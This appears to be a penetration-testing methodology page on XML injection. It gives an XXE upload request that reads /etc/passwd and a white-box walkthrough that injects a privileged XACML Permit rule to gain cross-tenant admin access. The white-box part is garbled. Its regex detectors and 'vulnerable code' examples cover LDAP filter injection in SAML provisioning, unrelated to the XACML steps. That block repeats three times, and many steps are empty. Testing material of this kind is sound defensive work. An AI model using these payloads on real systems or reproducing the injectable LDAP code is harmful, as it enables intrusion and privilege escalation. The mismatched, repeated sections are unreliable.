# XML Injection

## Check List

## Methodology

### Black Box

#### [XXE In Filename](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Intruders/xml-attacks.txt)

{% stepper %}
{% step %}
Log in to a user account and navigate to the profile or settings page with an image upload feature, capturing the upload request with Burp Suite
{% endstep %}

{% step %}
Intercept the POST request to the upload endpoint (`/upload`,) and locate the file type parameter or file extension in filename
{% endstep %}

{% step %}
then change the file extension from `.jpg` to `.html` or `.xml` while keeping image content
{% endstep %}

{% step %}
Upload a malicious XML file with an external entity like

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: XXX

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="exploit.xml"
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
------WebKitFormBoundary--
```
{% endstep %}

{% step %}
If the server response shows content from the `etc/passwd` file, the vulnerability has been registered
{% endstep %}
{% endstepper %}

***

### White Box

#### Privilege Escalation via String-Templated XACML Policy Compilation

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on multitenant environments that allow organizational administrators to define custom access policies, resource groups, or role-based boundaries
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a distributed Attribute-Based Access Control (ABAC) architecture. Modern meshes often centralize authorization decisions using a Policy Decision Point (PDP) that evaluates standard XML-based XACML (eXtensible Access Control Markup Language) rules against incoming requests
{% endstep %}

{% step %}
Investigate the "Policy Management API" utilized by the frontend SPA. To provide a smooth user experience, the API accepts lightweight JSON payloads (e.g., `{"role": "Auditor", "resource": "Billing-Reports"}`)
{% endstep %}

{% step %}
Analyze the translation layer inside the Policy Administration Point (PAP). The microservice must compile the frontend JSON into strict, highly verbose XACML documents before distributing them to the caching tier
{% endstep %}

{% step %}
Discover the compilation optimization: Constructing XACML documents via a rigid XML DOM builder (e.g., `XmlDocument`, `DocumentBuilder`) is highly verbose and consumes substantial memory allocations for massive policy trees. To optimize compilation speed, developers utilize raw string templates (e.g., `string.Format`, template literals) to rapidly generate the XML payload
{% endstep %}

{% step %}
Understand the trust boundary collapse: The developer explicitly trusts the JSON values originating from the authenticated Tenant Administrator, assuming that organizational resource names or role descriptions cannot contain XML structural metacharacters
{% endstep %}

{% step %}
Locate the exact compilation template in the decompiled codebase. Observe the location of the user-controlled interpolation
{% endstep %}

{% step %}
Formulate an XML Structure Injection payload. Because XACML evaluates rules sequentially (often employing a "First-Applicable" or "Permit-Overrides" combining algorithm), injecting a completely new `<Rule>` block before the intended closure alters the entire cryptographic policy context
{% endstep %}

{% step %}
Authenticate to the application as a Tenant Administrator for `Tenant_A`
{% endstep %}

{% step %}
Submit a custom policy configuration via the JSON API. Inside the `resource_name` parameter, inject the XML syntax breaker

```xml
</AttributeValue></Match></AllOf></AnyOf></Target></Rule><Rule Effect="Permit"><Target><AnyOf><AllOf><Match MatchId="urn:oasis:names:tc:xacml:1.0:function:string-equal"><AttributeValue DataType="[http://www.w3.org/2001/XMLSchema#string](http://www.w3.org/2001/XMLSchema#string)">Global_Admin_Dashboard</AttributeValue>
```
{% endstep %}

{% step %}
The Policy Administration Point (PAP) receives the JSON, performs string interpolation, and blindly closes the intended rule while instantiating your injected, highly privileged `Permit` rule
{% endstep %}

{% step %}
The poisoned XACML document is published to the Policy Enforcement Points (PEPs) at the network edge
{% endstep %}

{% step %}
Send a request to the global administrative dashboard. The PEP evaluates the active XACML policy, encounters your injected rule, and grants you access to cross-tenant or platform-wide infrastructure

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
```
{% endtab %}

{% tab title="Java" %}
```regexp
searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
```
{% endtab %}

{% tab title="PHP" %}
```regexp
ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class SamlProvisioningService 
{
    private readonly LdapConnection _ldapConnection;

    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
    {
        // [1]
        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");

        // [2]
        // [3]
        // [4]
        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
        
        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);

        return ExtractRolesFromLdapResponse(response);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class SamlProvisioningService {

    @Autowired
    private LdapTemplate ldapTemplate;

    public List<String> hydrateUserRoles(SamlAssertion assertion) {
        // [1]
        String departmentClaim = assertion.getAttribute("Department");

        // [2]
        // [3]
        // [4]
        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
        
        List<String> roles = ldapTemplate.search(
            query().base("DC=enterprise,DC=local").filter(searchFilter),
            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
        );

        return roles;
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class SamlProvisioningService 
{
    protected $ldapConnection;

    public function hydrateUserRoles(SamlAssertion $assertion): array 
    {
        // [1]
        $departmentClaim = $assertion->getAttribute('Department');

        // [2]
        // [3]
        // [4]
        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
        
        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
        $entries = ldap_get_entries($this->ldapConnection, $search);

        return $this->extractRoles($entries);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class SamlProvisioningService {
    static async hydrateUserRoles(assertion) {
        // [1]
        let departmentClaim = assertion.attributes['Department'];

        // [2]
        // [3]
        // [4]
        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;

        let opts = {
            filter: searchFilter,
            scope: 'sub',
            attributes: ['memberOf']
        };

        return new Promise((resolve, reject) => {
            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
                let roles = [];
                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
                res.on('end', () => resolve(roles));
                res.on('error', (err) => reject(err));
            });
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}
{% endstepper %}

***

{% stepper %}
{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}


**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
```
{% endtab %}

{% tab title="Java" %}
```regexp
searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
```
{% endtab %}

{% tab title="PHP" %}
```regexp
ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class SamlProvisioningService 
{
    private readonly LdapConnection _ldapConnection;

    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
    {
        // [1]
        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");

        // [2]
        // [3]
        // [4]
        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
        
        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);

        return ExtractRolesFromLdapResponse(response);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class SamlProvisioningService {

    @Autowired
    private LdapTemplate ldapTemplate;

    public List<String> hydrateUserRoles(SamlAssertion assertion) {
        // [1]
        String departmentClaim = assertion.getAttribute("Department");

        // [2]
        // [3]
        // [4]
        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
        
        List<String> roles = ldapTemplate.search(
            query().base("DC=enterprise,DC=local").filter(searchFilter),
            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
        );

        return roles;
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class SamlProvisioningService 
{
    protected $ldapConnection;

    public function hydrateUserRoles(SamlAssertion $assertion): array 
    {
        // [1]
        $departmentClaim = $assertion->getAttribute('Department');

        // [2]
        // [3]
        // [4]
        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
        
        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
        $entries = ldap_get_entries($this->ldapConnection, $search);

        return $this->extractRoles($entries);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class SamlProvisioningService {
    static async hydrateUserRoles(assertion) {
        // [1]
        let departmentClaim = assertion.attributes['Department'];

        // [2]
        // [3]
        // [4]
        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;

        let opts = {
            filter: searchFilter,
            scope: 'sub',
            attributes: ['memberOf']
        };

        return new Promise((resolve, reject) => {
            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
                let roles = [];
                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
                res.on('end', () => resolve(roles));
                res.on('error', (err) => reject(err));
            });
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}
{% endstepper %}

***

{% stepper %}
{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}


**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
```
{% endtab %}

{% tab title="Java" %}
```regexp
searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
```
{% endtab %}

{% tab title="PHP" %}
```regexp
ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class SamlProvisioningService 
{
    private readonly LdapConnection _ldapConnection;

    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
    {
        // [1]
        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");

        // [2]
        // [3]
        // [4]
        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
        
        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);

        return ExtractRolesFromLdapResponse(response);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class SamlProvisioningService {

    @Autowired
    private LdapTemplate ldapTemplate;

    public List<String> hydrateUserRoles(SamlAssertion assertion) {
        // [1]
        String departmentClaim = assertion.getAttribute("Department");

        // [2]
        // [3]
        // [4]
        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
        
        List<String> roles = ldapTemplate.search(
            query().base("DC=enterprise,DC=local").filter(searchFilter),
            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
        );

        return roles;
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class SamlProvisioningService 
{
    protected $ldapConnection;

    public function hydrateUserRoles(SamlAssertion $assertion): array 
    {
        // [1]
        $departmentClaim = $assertion->getAttribute('Department');

        // [2]
        // [3]
        // [4]
        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
        
        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
        $entries = ldap_get_entries($this->ldapConnection, $search);

        return $this->extractRoles($entries);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class SamlProvisioningService {
    static async hydrateUserRoles(assertion) {
        // [1]
        let departmentClaim = assertion.attributes['Department'];

        // [2]
        // [3]
        // [4]
        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;

        let opts = {
            filter: searchFilter,
            scope: 'sub',
            attributes: ['memberOf']
        };

        return new Promise((resolve, reject) => {
            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
                let roles = [];
                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
                res.on('end', () => resolve(roles));
                res.on('error', (err) => reject(err));
            });
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}
{% endstepper %}

***

## Cheat Sheet
